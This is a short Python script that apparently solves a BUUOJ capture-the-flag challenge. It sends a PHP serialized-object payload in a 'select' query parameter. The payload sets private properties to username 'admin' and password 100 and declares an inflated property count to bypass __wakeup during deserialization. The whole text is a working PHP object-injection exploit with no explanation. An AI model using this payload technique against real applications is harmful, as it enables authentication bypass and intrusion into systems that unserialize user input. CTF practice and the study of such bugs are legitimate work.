import  requests

url ="http://417183fb-44b8-4b86-ac63-4cc68f54d219.node3.buuoj.cn"
html = requests.get(url+'?select=O:4:"Name":3:{s:14:"\0Name\0username";s:5:"admin";s:14:"\0Name\0password";i:100;}')
print(html.text)
